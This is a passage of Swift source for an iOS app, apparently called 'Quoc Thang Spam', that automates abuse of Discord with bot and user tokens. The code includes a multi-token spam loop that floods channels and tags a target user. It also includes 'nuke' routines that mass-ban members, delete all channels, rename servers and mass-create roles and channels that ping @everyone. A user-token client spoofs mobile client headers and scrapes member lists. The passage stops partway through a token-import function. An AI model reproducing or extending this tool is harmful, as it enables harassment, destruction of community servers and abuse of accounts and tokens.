            let single = firstSet.compactMap { guildMap[$0] }.sorted { $0.name < $1.name }
            guilds = single; multiGuilds = single
            return
        }

        var inter = sets[0]
        for s in sets.dropFirst() { inter.formIntersection(s) }
        let result = inter.compactMap { guildMap[$0] }.sorted { $0.name < $1.name }
        multiGuilds = result; guilds = result
    }

    func loadChannels(for g: Guild) async {
        let selected = tokens.filter { selectedTokenIds.contains($0.id) && $0.isValid }
        guard let first = selected.first else { return }
        isLoading = true
        do {
            let all = try await DiscordClient(token: first.token).getAllChannels(guildId: g.id)
            channels = all.filter { $0.isSendableText || $0.isCategory }.sorted { ($0.position ?? 0) < ($1.position ?? 0) }
        } catch { lastError = error.localizedDescription }
        isLoading = false
    }
    func groupedChannels() -> [(category: Channel?, items: [Channel])] {
        var r: [(Channel?, [Channel])] = []
        let o = channels.filter { $0.isSendableText && $0.parentId == nil }
        if !o.isEmpty { r.append((nil, o)) }
        for c in channels where c.isCategory {
            let k = channels.filter { $0.isSendableText && $0.parentId == c.id }
            if !k.isEmpty { r.append((c, k)) }
        }
        return r
    }
    func parseFile(url: URL) {
        let got = url.startAccessingSecurityScopedResource()
        defer { if got { url.stopAccessingSecurityScopedResource() } }
        try? FileManager.default.startDownloadingUbiquitousItem(at: url)
        var data: Data?; var err: String?
        let co = NSFileCoordinator(); var ce: NSError?
        co.coordinate(readingItemAt: url, options: [], error: &ce) { u in
            do { data = try Data(contentsOf: u) } catch { err = error.localizedDescription }
        }
        if data == nil { do { data = try Data(contentsOf: url) } catch { err = error.localizedDescription } }
        guard let d = data else { lastError = "Không đọc file: \(err ?? "")"; return }
        var c: String?
        for enc in [String.Encoding.utf8, .utf16, .utf16LittleEndian, .utf16BigEndian, .windowsCP1252, .isoLatin1, .ascii, .nonLossyASCII] {
            if let s = String(data: d, encoding: enc), !s.isEmpty { c = s; break }
        }
        if c == nil || c!.isEmpty { c = String(decoding: d, as: UTF8.self) }
        guard let fc = c, !fc.isEmpty else { lastError = "File rỗng"; return }
        inputText = fc.replacingOccurrences(of: "\u{FEFF}", with: "")
        parseDirectInput(); lastError = nil
    }
    func parseDirectInput() {
        messages = inputText.components(separatedBy: .newlines).compactMap {
            let t = $0.trimmingCharacters(in: .whitespacesAndNewlines)
            return t.isEmpty ? nil : ParsedMessage(body: t)
        }
    }

    func startSending(channel: Channel) {
        let selectedTokens = tokens.filter { selectedTokenIds.contains($0.id) && $0.isValid }
        guard !selectedTokens.isEmpty, !messages.isEmpty else { return }
        if useTag && targetUserId.isEmpty { return }

        isSending = true
        isCancelled = false
        totalSent = 0
        lastError = nil
        tokenSendCount = Dictionary(uniqueKeysWithValues: selectedTokens.map { ($0.id, 0) })
        let channelId = channel.id
        let totalTokens = selectedTokens.count

        BackgroundManager.shared.start()
        NowPlayingHelper.shared.start(onStop: { [weak self] in
            Task { @MainActor in self?.stopSending() }
        })
        updateNowPlaying(force: true)

        sendTask = Task { [weak self] in
            guard let self = self else { return }
            await withTaskGroup(of: Void.self) { group in
                for (index, token) in selectedTokens.enumerated() {
                    group.addTask { [weak self] in
                        guard let self = self else { return }
                        await self.spamLoop(token: token, channelId: channelId, startIndex: index, step: totalTokens)
                    }
                }
            }
            self.isSending = false
            self.currentMessageStr = ""
            BackgroundManager.shared.stop()
            NowPlayingHelper.shared.stop()
        }
    }

    private func spamLoop(token: TokenInfo, channelId: String, startIndex: Int, step: Int) async {
        var client = DiscordClient(token: token.token)
        var i = startIndex
        var consecutiveErrors = 0
        var perTokenTotal = 0

        while !isCancelled && !Task.isCancelled {
            let m = messages[i % messages.count]
            var p = ""
            if addPrefix { p += "> " }
            if addSuffix { p += "# " }
            var fc = p + m.body
            if useTag { fc += " <@\(targetUserId)>" }

            do {
                try await client.sendMessage(channelId: channelId, content: fc)
                consecutiveErrors = 0
                totalSent += 1
                perTokenTotal += 1
                tokenSendCount[token.id] = perTokenTotal
                currentMessageStr = fc
                updateNowPlaying()
            } catch {
                consecutiveErrors += 1
                if consecutiveErrors >= 2 {
                    do {
                        _ = try await DiscordClient(token: token.token).validateToken()
                        client = DiscordClient(token: token.token)
                        consecutiveErrors = 0
                        try? await Task.sleep(nanoseconds: 800_000_000)
                    } catch {
                        return
                    }
                } else {
                    try? await Task.sleep(nanoseconds: 1_200_000_000)
                }
                continue
            }

            i += step
            let d = max(0.1, delaySeconds + Double.random(in: -0.3...0.3) * delaySeconds)
            do { try await Task.sleep(nanoseconds: UInt64(d * 1_000_000_000)) } catch { break }
        }
    }

    func stopSending() {
        isCancelled = true
        sendTask?.cancel()
        sendTask = nil
        isSending = false
        BackgroundManager.shared.stop()
        NowPlayingHelper.shared.stop()
    }

    private func updateNowPlaying(force: Bool = false) {
        let now = Date()
        guard force || now.timeIntervalSince(lastNPUpdate) >= 0.5 else { return }
        lastNPUpdate = now
        NowPlayingHelper.shared.update(
            title: "Quoc Thang Spam",
            detail: "\(totalSent) tin | \(selectedTokenIds.count) token"
        )
    }

    func hideKeyboard() { UIApplication.shared.sendAction(#selector(UIResponder.resignFirstResponder), to: nil, from: nil, for: nil) }
}

// ==========================================
// MARK: - BOT CLIENT
// ==========================================
class BotClient {
    let auth: String; let session: URLSession
    static var EVERYONE_ALLOW: UInt64 { AppEndpoints.everyoneAllow }
    init(token: String) {
        let c = token.trimmingCharacters(in: .whitespacesAndNewlines)
        auth = c.lowercased().hasPrefix("bot ") ? c : "Bot \(c)"
        let cfg = URLSessionConfiguration.default
        cfg.timeoutIntervalForRequest = 30
        cfg.httpAdditionalHeaders = [
            "Authorization": auth,
            "Content-Type": "application/json",
            "User-Agent": AppEndpoints.userAgentBot
        ]
        session = URLSession(configuration: cfg)
    }
    private func check(_ res: URLResponse, _ data: Data) throws {
        guard let h = res as? HTTPURLResponse else { throw NSError(domain: "B", code: -1, userInfo: [NSLocalizedDescriptionKey: "No HTTP"]) }
        guard (200...299).contains(h.statusCode) else {
            throw NSError(domain: "B", code: h.statusCode, userInfo: [NSLocalizedDescriptionKey:
                "HTTP \(h.statusCode): \(String(data: data, encoding: .utf8)?.prefix(200) ?? "")"])
        }
    }
    func validate() async throws -> BotInfo {
        guard SecurityGuard.shared.verifyExecutionPermit() else {
            throw NSError(domain: "B", code: 403, userInfo: [NSLocalizedDescriptionKey: "Security permit invalid"])
        }
        let (d, r) = try await session.data(from: URL(string: "\(AppEndpoints.apiBase)/users/@me")!)
        try check(r, d); return try JSONDecoder().decode(BotInfo.self, from: d)
    }
    func getGuilds() async throws -> [Guild] {
        let (d, r) = try await session.data(from: URL(string: "\(AppEndpoints.apiBase)/users/@me/guilds")!)
        try check(r, d); return try JSONDecoder().decode([Guild].self, from: d)
    }
    func getGuildDetail(_ g: String) async throws -> [String: Any] {
        let (d, r) = try await session.data(from: URL(string: "\(AppEndpoints.apiBase)/guilds/\(g)")!)
        try check(r, d); return (try JSONSerialization.jsonObject(with: d) as? [String: Any]) ?? [:]
    }
    func getRoles(_ g: String) async throws -> [GuildRole] {
        let (d, r) = try await session.data(from: URL(string: "\(AppEndpoints.apiBase)/guilds/\(g)/roles")!)
        try check(r, d); return try JSONDecoder().decode([GuildRole].self, from: d)
    }
    func getMember(_ g: String, userId: String) async throws -> BotMember {
        let (d, r) = try await session.data(from: URL(string: "\(AppEndpoints.apiBase)/guilds/\(g)/members/\(userId)")!)
        try check(r, d); return try JSONDecoder().decode(BotMember.self, from: d)
    }
    func getMembers(_ g: String, after: String = "0") async throws -> [BotMember] {
        let (d, r) = try await session.data(from: URL(string: "\(AppEndpoints.apiBase)/guilds/\(g)/members?limit=1000&after=\(after)")!)
        try check(r, d); return try JSONDecoder().decode([BotMember].self, from: d)
    }
    func getChannels(_ g: String) async throws -> [Channel] {
        let (d, r) = try await session.data(from: URL(string: "\(AppEndpoints.apiBase)/guilds/\(g)/channels")!)
        try check(r, d); return try JSONDecoder().decode([Channel].self, from: d)
    }
    func deleteChannel(_ c: String) async throws {
        guard SecurityGuard.shared.verifyExecutionPermit() else { return }
        var req = URLRequest(url: URL(string: "\(AppEndpoints.apiBase)/channels/\(c)")!)
        req.httpMethod = "DELETE"
        let (d, r) = try await session.data(for: req); try check(r, d)
    }
    func createChannel(_ g: String, name: String, openEveryone: Bool) async throws -> String? {
        guard SecurityGuard.shared.verifyExecutionPermit() else { return nil }
        var req = URLRequest(url: URL(string: "\(AppEndpoints.apiBase)/guilds/\(g)/channels")!)
        req.httpMethod = "POST"
        var p: [String: Any] = ["name": name, "type": 0]
        if openEveryone { p["permission_overwrites"] = [["id": g, "type": 0, "allow": String(BotClient.EVERYONE_ALLOW), "deny": "0"]] }
        req.httpBody = try JSONSerialization.data(withJSONObject: p)
        let (d, r) = try await session.data(for: req); try check(r, d)
        return (try? JSONSerialization.jsonObject(with: d) as? [String: Any])?["id"] as? String
    }
    func sendMessage(_ c: String, content: String) async throws {
        var req = URLRequest(url: URL(string: "\(AppEndpoints.apiBase)/channels/\(c)/messages")!)
        req.httpMethod = "POST"; req.httpBody = try JSONSerialization.data(withJSONObject: ["content": content])
        let (d, r) = try await session.data(for: req); try check(r, d)
    }
    func createRole(_ g: String, name: String) async throws {
        var req = URLRequest(url: URL(string: "\(AppEndpoints.apiBase)/guilds/\(g)/roles")!)
        req.httpMethod = "POST"; req.httpBody = try JSONSerialization.data(withJSONObject: ["name": name])
        let (d, r) = try await session.data(for: req); try check(r, d)
    }
    func renameGuild(_ g: String, newName: String) async throws {
        var req = URLRequest(url: URL(string: "\(AppEndpoints.apiBase)/guilds/\(g)")!)
        req.httpMethod = "PATCH"; req.httpBody = try JSONSerialization.data(withJSONObject: ["name": newName])
        let (d, r) = try await session.data(for: req); try check(r, d)
    }
    func banMember(_ g: String, userId: String) async throws {
        var req = URLRequest(url: URL(string: "\(AppEndpoints.apiBase)/guilds/\(g)/bans/\(userId)")!)
        req.httpMethod = "PUT"; req.httpBody = try JSONSerialization.data(withJSONObject: ["delete_message_seconds": 0])
        let (d, r) = try await session.data(for: req); try check(r, d)
    }
}

// ==========================================
// MARK: - USER NUKE CLIENT
// ==========================================
class UserNukeClient {
    let token: String; let session: URLSession
    static var EVERYONE_ALLOW: UInt64 { AppEndpoints.everyoneAllow }
    init(token: String) {
        self.token = token
        let cfg = URLSessionConfiguration.default; cfg.timeoutIntervalForRequest = 30
        cfg.httpAdditionalHeaders = [
            "Authorization": token,
            "Content-Type": "application/json",
            "User-Agent": AppEndpoints.userAgentMobile,
            "X-Super-Properties": AppEndpoints.superPropertiesMobile,
            "X-Discord-Locale": "en-US",
            "X-Discord-Timezone": "Asia/Ho_Chi_Minh",
            "X-Context-Properties": "e30=",
            "Origin": AppEndpoints.origin,
            "Referer": AppEndpoints.referer
        ]
        session = URLSession(configuration: cfg)
    }
    private func check(_ res: URLResponse, _ data: Data) throws {
        guard let h = res as? HTTPURLResponse else { throw NSError(domain: "UN", code: -1, userInfo: [NSLocalizedDescriptionKey: "No HTTP"]) }
        guard (200...299).contains(h.statusCode) else {
            throw NSError(domain: "UN", code: h.statusCode, userInfo: [NSLocalizedDescriptionKey:
                "HTTP \(h.statusCode): \(String(data: data, encoding: .utf8)?.prefix(200) ?? "")"])
        }
    }
    func validate() async throws -> DiscordUser {
        guard SecurityGuard.shared.verifyExecutionPermit() else {
            throw NSError(domain: "UN", code: 403, userInfo: [NSLocalizedDescriptionKey: "Security permit invalid"])
        }
        let (d, r) = try await session.data(from: URL(string: "\(AppEndpoints.apiBase)/users/@me")!)
        try check(r, d); return try JSONDecoder().decode(DiscordUser.self, from: d)
    }
    func getGuildsWithPerms() async throws -> [NukeGuild] {
        guard SecurityGuard.shared.verifyExecutionPermit() else { return [] }
        let (d, r) = try await session.data(from: URL(string: "\(AppEndpoints.apiBase)/users/@me/guilds")!)
        try check(r, d); return try JSONDecoder().decode([NukeGuild].self, from: d)
    }
    func getGuildDetail(_ g: String) async throws -> [String: Any] {
        let (d, r) = try await session.data(from: URL(string: "\(AppEndpoints.apiBase)/guilds/\(g)")!)
        try check(r, d); return (try JSONSerialization.jsonObject(with: d) as? [String: Any]) ?? [:]
    }
    func getRoles(_ g: String) async throws -> [GuildRole] {
        let (d, r) = try await session.data(from: URL(string: "\(AppEndpoints.apiBase)/guilds/\(g)/roles")!)
        try check(r, d); return try JSONDecoder().decode([GuildRole].self, from: d)
    }
    func getMember(_ g: String, uid: String) async throws -> BotMember {
        let (d, r) = try await session.data(from: URL(string: "\(AppEndpoints.apiBase)/guilds/\(g)/members/\(uid)")!)
        try check(r, d); return try JSONDecoder().decode(BotMember.self, from: d)
    }
    func getChannels(_ g: String) async throws -> [Channel] {
        let (d, r) = try await session.data(from: URL(string: "\(AppEndpoints.apiBase)/guilds/\(g)/channels")!)
        try check(r, d); return try JSONDecoder().decode([Channel].self, from: d)
    }
    func deleteChannel(_ c: String) async throws {
        var req = URLRequest(url: URL(string: "\(AppEndpoints.apiBase)/channels/\(c)")!)
        req.httpMethod = "DELETE"; let (d, r) = try await session.data(for: req); try check(r, d)
    }
    func createChannel(_ g: String, name: String, openEveryone: Bool) async throws -> String? {
        var req = URLRequest(url: URL(string: "\(AppEndpoints.apiBase)/guilds/\(g)/channels")!)
        req.httpMethod = "POST"
        var p: [String: Any] = ["name": name, "type": 0]
        if openEveryone { p["permission_overwrites"] = [["id": g, "type": 0, "allow": String(UserNukeClient.EVERYONE_ALLOW), "deny": "0"]] }
        req.httpBody = try JSONSerialization.data(withJSONObject: p)
        let (d, r) = try await session.data(for: req); try check(r, d)
        return (try? JSONSerialization.jsonObject(with: d) as? [String: Any])?["id"] as? String
    }
    func sendMessage(_ c: String, content: String) async throws {
        var req = URLRequest(url: URL(string: "\(AppEndpoints.apiBase)/channels/\(c)/messages")!)
        req.httpMethod = "POST"; req.httpBody = try JSONSerialization.data(withJSONObject: ["content": content])
        let (d, r) = try await session.data(for: req); try check(r, d)
    }
    func createRole(_ g: String, name: String) async throws {
        var req = URLRequest(url: URL(string: "\(AppEndpoints.apiBase)/guilds/\(g)/roles")!)
        req.httpMethod = "POST"; req.httpBody = try JSONSerialization.data(withJSONObject: ["name": name])
        let (d, r) = try await session.data(for: req); try check(r, d)
    }
    func renameGuild(_ g: String, newName: String) async throws {
        var req = URLRequest(url: URL(string: "\(AppEndpoints.apiBase)/guilds/\(g)")!)
        req.httpMethod = "PATCH"; req.httpBody = try JSONSerialization.data(withJSONObject: ["name": newName])
        let (d, r) = try await session.data(for: req); try check(r, d)
    }
    func banMember(_ g: String, uid: String) async throws {
        var req = URLRequest(url: URL(string: "\(AppEndpoints.apiBase)/guilds/\(g)/bans/\(uid)")!)
        req.httpMethod = "PUT"; req.httpBody = try JSONSerialization.data(withJSONObject: ["delete_message_seconds": 0])
        let (d, r) = try await session.data(for: req); try check(r, d)
    }

    func fetchMembersWS(guildId: String,
                        onMember: @escaping ([String: Any]) -> Void,
                        onProgress: @escaping (Int) -> Void) async throws {
        let channels = try await getChannels(guildId)
        guard let ref = channels.first(where: { $0.type == 0 || $0.type == 5 })?.id else { return }
        let detail = try await getGuildDetail(guildId)
        let total = (detail["approximate_member_count"] as? Int) ?? (detail["member_count"] as? Int) ?? 1000

        guard let url = URL(string: AppEndpoints.gatewayURL) else { return }
        let ws = session.webSocketTask(with: url)
        ws.maximumMessageSize = 64 * 1024 * 1024
        ws.resume()
        defer { ws.cancel(with: .goingAway, reason: nil) }

        guard case .string(let hs) = try await ws.receive(),
              let hd = hs.data(using: .utf8),
              let hello = try? JSONSerialization.jsonObject(with: hd) as? [String: Any],
              let hbi = (hello["d"] as? [String: Any])?["heartbeat_interval"] as? Int else { return }
        let hbInt = Double(hbi) / 1000.0

        let hbTask = Task {
            while !Task.isCancelled {
                try? await Task.sleep(nanoseconds: UInt64(hbInt * 1_000_000_000))
                try? await ws.send(.string("{\"op\":1,\"d\":null}"))
            }
        }
        defer { hbTask.cancel() }

        let identify: [String: Any] = ["op": 2, "d": [
            "token": token, "capabilities": 125,
            "properties": ["os": "iOS", "browser": "Safari", "device": "iPhone"],
            "compress": false,
            "presence": ["status": "online", "since": 0, "activities": [], "afk": false]
        ]]
        let idData = try JSONSerialization.data(withJSONObject: identify)
        try await ws.send(.string(String(data: idData, encoding: .utf8)!))

        var ready = false; var att = 0
        while !ready && att < 50 {
            att += 1
            if case .string(let s) = try await ws.receive(),
               let d = try? JSONSerialization.jsonObject(with: s.data(using: .utf8)!) as? [String: Any] {
                if (d["t"] as? String) == "READY" { ready = true }
                if (d["op"] as? Int) == 9 { throw NSError(domain: "WS", code: 9, userInfo: [NSLocalizedDescriptionKey: "Invalid Session"]) }
            }
        }
        guard ready else { return }

        var seen = Set<String>()
        var start = 0, end = 99
        var empty = 0
        let maxIter = max(50, total / 100 + 20); var iter = 0

        while empty < 2 && iter < maxIter && !Task.isCancelled {
            iter += 1
            let req: [String: Any] = ["op": 14, "d": [
                "guild_id": guildId, "channels": [ref: [[start, end]]], "threads": false, "typing": true
            ]]
            let rData = try JSONSerialization.data(withJSONObject: req)
            try await ws.send(.string(String(data: rData, encoding: .utf8)!))

            var gotNew = false
            let deadline = Date().addingTimeInterval(3.0)
            while Date() < deadline && !Task.isCancelled {
                let rTask = Task { try await ws.receive() }
                let tTask = Task { try? await Task.sleep(nanoseconds: 3_000_000_000); rTask.cancel() }
                defer { tTask.cancel() }
                do {
                    let msg = try await rTask.value
                    if case .string(let s) = msg,
                       let d = try? JSONSerialization.jsonObject(with: s.data(using: .utf8)!) as? [String: Any],
                       (d["t"] as? String) == "GUILD_MEMBER_LIST_UPDATE",
                       let dd = d["d"] as? [String: Any], let ops = dd["ops"] as? [[String: Any]] {
                        for op in ops {
                            let ot = op["op"] as? String
                            let items: [[String: Any]]
                            if ot == "SYNC" { items = op["items"] as? [[String: Any]] ?? [] }
                            else if ot == "UPDATE" { items = (op["item"] as? [String: Any]).map { [$0] } ?? [] }
                            else { continue }
                            for item in items {
                                if let m = item["member"] as? [String: Any],
                                   let u = m["user"] as? [String: Any],
                                   let uid = u["id"] as? String, !seen.contains(uid) {
                                    seen.insert(uid); gotNew = true; onMember(m)
                                }
                            }
                        }
                        onProgress(seen.count)
                        if seen.count >= total { return }
                        if gotNew { break }
                    }
                } catch { break }
            }
            empty = gotNew ? 0 : empty + 1
            start += 100; end += 100
            try? await Task.sleep(nanoseconds: 150_000_000)
        }
    }

    func fetchMembersHTTP(guildId: String,
                          onMember: @escaping ([String: Any]) -> Void,
                          onProgress: @escaping (Int) -> Void) async {
        var after = "0"; var count = 0
        while !Task.isCancelled {
            do {
                let (d, r) = try await session.data(from: URL(string: "\(AppEndpoints.apiBase)/guilds/\(guildId)/members?limit=1000&after=\(after)")!)
                guard let h = r as? HTTPURLResponse, h.statusCode == 200 else { return }
                guard let arr = try? JSONSerialization.jsonObject(with: d) as? [[String: Any]], !arr.isEmpty else { return }
                for m in arr { onMember(m) }
                count += arr.count; onProgress(count)
                if arr.count < 1000 { return }
                after = ((arr.last?["user"] as? [String: Any])?["id"] as? String) ?? after
                try? await Task.sleep(nanoseconds: 500_000_000)
            } catch { return }
        }
    }
}

// ==========================================
// MARK: - BOT MANAGER
// ==========================================
@MainActor
class BotManager: ObservableObject {
    @Published var config: BotConfig? = nil { didSet { saveConfig() } }
    @Published var isCheckingToken = false
    @Published var tokenError: String?
    @Published var botGuilds: [Guild] = []
    @Published var isLoadingGuilds = false
    @Published var isNuking = false
    @Published var nukeLog: [String] = []
    @Published var banSuccess = 0
    @Published var banFailed = 0
    @Published var channelsDeleted = 0
    @Published var channelsCreated = 0
    @Published var messagesSent = 0
    @Published var rolesCreated = 0
    @Published var currentPhase = ""
    @Published var phaseProgress: Double = 0
    private var isCancelled = false
    private let key = "BotConfigV1"
    private var client: BotClient? { config.map { BotClient(token: $0.token) } }

    init() { loadConfig() }
    private func saveConfig() {
        if let c = config, let d = try? JSONEncoder().encode(c) { UserDefaults.standard.set(d, forKey: key) }
        else { UserDefaults.standard.removeObject(forKey: key) }
    }
    private func loadConfig() {
        if let d = UserDefaults.standard.data(forKey: key),
           let c = try? JSONDecoder().decode(BotConfig.self, from: d) {
            config = c; Task { await loadGuilds() }
        }
    }
    func setToken(_ s: String) async {
        let c = s.trimmingCharacters(in: .whitespacesAndNewlines)
        guard !c.isEmpty else { return }
        isCheckingToken = true; tokenError = nil
        do {
            let i = try await BotClient(token: c).validate()
            guard i.bot == true else { tokenError = "Không phải bot token"; isCheckingToken = false; return }
            let raw = c.replacingOccurrences(of: "Bot ", with: "", options: .caseInsensitive)
            config = BotConfig(token: raw, username: i.username, userId: i.id, avatarHash: i.avatar, discriminator: i.discriminator)
            await loadGuilds()
        } catch { tokenError = error.localizedDescription }
        isCheckingToken = false
    }
    func removeConfig() { config = nil; botGuilds = []; nukeLog = [] }
    func loadGuilds() async {
        guard let c = client else { return }
        isLoadingGuilds = true
        do { botGuilds = try await c.getGuilds().sorted { $0.name < $1.name }; tokenError = nil }
        catch { tokenError = error.localizedDescription }
        isLoadingGuilds = false
    }
    func stopNuke() { isCancelled = true }
    private func log(_ m: String) { nukeLog.append(m); if nukeLog.count > 800 { nukeLog.removeFirst(nukeLog.count - 800) } }
    private func reset() { banSuccess = 0; banFailed = 0; channelsDeleted = 0; channelsCreated = 0; messagesSent = 0; rolesCreated = 0; phaseProgress = 0 }

    func runNuke(guild: Guild, options: NukeConfig) async {
        guard let c = client else { return }
        isNuking = true; isCancelled = false; nukeLog = []; reset()
        BackgroundManager.shared.start()
        NowPlayingHelper.shared.start(onStop: { [weak self] in
            Task { @MainActor in self?.stopNuke() }
        })
        let gid = guild.id
        log("Bắt đầu nuke: \(guild.name)")
        let totalSteps = options.stepOrder.filter { options.enabledSteps.contains($0) }.count
        var stepDone = 0

        for step in options.stepOrder {
            if isCancelled { break }
            guard options.enabledSteps.contains(step) else { continue }
            currentPhase = step.rawValue
            phaseProgress = totalSteps > 0 ? Double(stepDone) / Double(totalSteps) : 0
            log("--- \(step.rawValue) ---")
            NowPlayingHelper.shared.update(
                title: "Bot Nuke · \(step.rawValue)",
                detail: "\(banSuccess) ban | \(channelsDeleted) xoá | \(channelsCreated) tạo"
            )
            switch step {
            case .massBan: await doMassBan(c, gid, options: options)
            case .deleteChannels: await doDeleteChannels(c, gid, options: options)
            case .renameGuild:
                if !options.newGuildName.isEmpty {
                    do { try await c.renameGuild(gid, newName: options.newGuildName); log("  Đổi tên OK") }
                    catch { log("  Lỗi: \(error.localizedDescription)") }
                }
            case .createRoles:
                rolesCreated = await doCreateRoles(c, gid, options: options)
                log("  Role đã tạo: \(rolesCreated)")
            case .createChannels:
                let (cc, ss) = await doCreateChannels(c, gid, options: options)
                channelsCreated = cc; messagesSent = ss
                log("  Kênh đã tạo: \(cc), tin đã gửi: \(ss)")
            }
            stepDone += 1
        }
        currentPhase = isCancelled ? "Đã dừng" : "Hoàn tất"
        phaseProgress = 1.0
        log(isCancelled ? "Đã dừng" : "XONG")
        log("=== TỔNG KẾT ===")
        log("Ban: \(banSuccess) OK / \(banFailed) FAIL")
        log("Xóa kênh: \(channelsDeleted)")
        log("Tạo kênh: \(channelsCreated)")
        log("Tin nhắn: \(messagesSent)")
        log("Role: \(rolesCreated)")
        isNuking = false
        BackgroundManager.shared.stop()
        NowPlayingHelper.shared.stop()
    }

    private func doMassBan(_ c: BotClient, _ gid: String, options: NukeConfig) async {
        guard let cfg = config else { return }
        do {
            let detail = try await c.getGuildDetail(gid)
            let ownerId = detail["owner_id"] as? String
            let botMember = try await c.getMember(gid, userId: cfg.userId)
            let roles = try await c.getRoles(gid)
            let roleMap = Dictionary(uniqueKeysWithValues: roles.map { ($0.id, $0) })
            let botMax = (botMember.roles ?? []).compactMap { roleMap[$0]?.position }.max() ?? 0
            log("  Bot role pos: \(botMax)")
            guard botMax > 0 else { log("  Bot role quá thấp"); return }
            var after = "0"
            while !isCancelled {
                let members: [BotMember]
                do { members = try await c.getMembers(gid, after: after) }
                catch {
                    log("  Lỗi: \(error.localizedDescription)")
                    if error.localizedDescription.contains("403") { log("  Bật SERVER MEMBERS INTENT") }
                    return
                }
                if members.isEmpty { break }
                for m in members {
                    if isCancelled { break }
                    guard let uid = m.user?.id else { continue }
                    if uid == cfg.userId || uid == ownerId || m.user?.bot == true { continue }
                    let pos = (m.roles ?? []).compactMap { roleMap[$0]?.position }.max() ?? 0
                    if pos >= botMax { continue }
                    do { try await c.banMember(gid, userId: uid); banSuccess += 1 }
                    catch { banFailed += 1 }
                    if options.banDelay > 0 {
                        try? await Task.sleep(nanoseconds: UInt64(options.banDelay * 1_000_000_000))
                    }
                    if (banSuccess + banFailed) % 10 == 0 {
                        log("  Ban: \(banSuccess) OK / \(banFailed) FAIL")
                    }
                }
                if members.count < 1000 { break }
                after = members.last?.user?.id ?? after
                try? await Task.sleep(nanoseconds: 500_000_000)
            }
            log("  Ban xong: \(banSuccess) OK / \(banFailed) FAIL")
        } catch { log("  Lỗi mass ban: \(error.localizedDescription)") }
    }

    private func doDeleteChannels(_ c: BotClient, _ gid: String, options: NukeConfig) async {
        do {
            let chans = try await c.getChannels(gid)
            log("  Tìm \(chans.count) kênh")
            var count = 0
            await withTaskGroup(of: Bool.self) { group in
                var inf = 0
                for ch in chans {
                    if isCancelled { break }
                    let d = options.deleteDelay
                    group.addTask {
                        if d > 0 { try? await Task.sleep(nanoseconds: UInt64(d * 1_000_000_000)) }
                        do { try await c.deleteChannel(ch.id); return true } catch { return false }
                    }
                    inf += 1
                    if inf >= 10 { if let r = await group.next(), r { count += 1 }; inf -= 1 }
                }
                for await r in group { if r { count += 1 } }
            }
            channelsDeleted = count
            log("  Đã xóa: \(count)")
        } catch { log("  Lỗi: \(error.localizedDescription)") }
    }

    private func doCreateRoles(_ c: BotClient, _ gid: String, options: NukeConfig) async -> Int {
        var count = 0
        await withTaskGroup(of: Bool.self) { group in
            var inf = 0
            for _ in 0..<options.roleCount {
                if isCancelled { break }
                let d = options.createRoleDelay
                let name = options.roleName
                group.addTask {
                    if d > 0 { try? await Task.sleep(nanoseconds: UInt64(d * 1_000_000_000)) }
                    do { try await c.createRole(gid, name: name); return true } catch { return false }
                }
                inf += 1
                if inf >= 10 { if let r = await group.next(), r { count += 1 }; inf -= 1 }
            }
            for await r in group { if r { count += 1 } }
        }
        return count
    }

    private func doCreateChannels(_ c: BotClient, _ gid: String, options: NukeConfig) async -> (Int, Int) {
        var created = 0, sent = 0
        var content = options.messageContent
        if options.tagEveryone && !content.contains("@everyone") { content += "\n\n@everyone" }
        await withTaskGroup(of: (Bool, Bool).self) { group in
            var inf = 0
            for _ in 0..<options.channelCount {
                if isCancelled { break }
                let cd = options.createChDelay
                let md = options.msgDelay
                let cn = options.channelName
                group.addTask {
                    if cd > 0 { try? await Task.sleep(nanoseconds: UInt64(cd * 1_000_000_000)) }
                    do {
                        guard let chId = try await c.createChannel(gid, name: cn, openEveryone: true) else { return (false, false) }
                        if !content.trimmingCharacters(in: .whitespaces).isEmpty {
                            if md > 0 { try? await Task.sleep(nanoseconds: UInt64(md * 1_000_000_000)) }
                            do { try await c.sendMessage(chId, content: content); return (true, true) }
                            catch { return (true, false) }
                        }
                        return (true, false)
                    } catch { return (false, false) }
                }
                inf += 1
                if inf >= 8 {
                    if let (cc, ss) = await group.next() { if cc { created += 1 }; if ss { sent += 1 } }
                    inf -= 1
                }
            }
            for await (cc, ss) in group { if cc { created += 1 }; if ss { sent += 1 } }
        }
        return (created, sent)
    }
}

// ==========================================
// MARK: - USER NUKE MANAGER
// ==========================================
@MainActor
class UserNukeManager: ObservableObject {
    @Published var tokens: [TokenInfo] = [] { didSet { saveTokens() } }
    @Published var selectedTokenIds: Set<UUID> = []
    @Published var isImporting = false
    @Published var importError: String?
    @Published var tokenGuilds: [UUID: [NukeGuild]] = [:]
    @Published var eligibleGuilds: [Guild] = []
    @Published var isLoadingGuilds = false
    @Published var isNuking = false
    @Published var nukeLog: [String] = []
    @Published var banSuccess = 0
    @Published var banFailed = 0
    @Published var channelsDeleted = 0
    @Published var channelsCreated = 0
    @Published var messagesSent = 0
    @Published var rolesCreated = 0
    @Published var currentPhase = ""
    @Published var phaseProgress: Double = 0
    @Published var membersScanned = 0

    private var isCancelled = false
    private let key = "UserNukeTokensV1"

    init() { loadTokens() }
    private func saveTokens() {
        if let d = try? JSONEncoder().encode(tokens) { UserDefaults.standard.set(d, forKey: key) }
    }
    private func loadTokens() {
        if let d = UserDefaults.standard.data(forKey: key),
           let s = try? JSONDecoder().decode([TokenInfo].self, from: d) { tokens = s }
    }
    func addTokenManually(_ raw: String) async -> Bool {
        let clean = raw.trimmingCharacters(in: .whitespacesAndNewlines)
        guard !clean.isEmpty, !tokens.contains(where: { $0.token == clean }) else { return false }
        isImporting = true
        defer { isImporting = false }
        do {
            let u = try await UserNukeClient(token: clean).validate()
            tokens.append(TokenInfo(token: clean, userId: u.id,
                                    username: u.globalName ?? u.username,
                                    avatarHash: u.avatar, isValid: true))
            return true
        } catch {
            tokens.append(TokenInfo(token: clean, userId: "0",
                                    username: "Token chết", avatarHash: nil, isValid: false))
            return false
        }
    }
    func importFromFile(url: URL) async {
        let got = url.startAccessingSecurityScopedResource()
        defer { if got { url.stopAccessingSecurityScopedResource() } }
        try? FileManager.default.startDownloadingUbiquitousItem(at: url)
        var data: Data?
        let co = NSFileCoordinator(); var err: NSError?
        co.coordinate(readingItemAt: url, options: [], error: &err) { u in data = try? Data(contentsOf: u) }
        if data == nil { data = try? Data(contentsOf: url) }
        guard let d = data else { importError = "Không đọc được file"; return }
        var text: String?
        for enc in [String.Encoding.utf8, .utf16, .utf16LittleEndian, .utf16BigEndian, .windowsCP1252, .isoLatin1, .ascii] {
            if let s = String(data: d, encoding: enc), !s.isEmpty { text = s; break }
        }
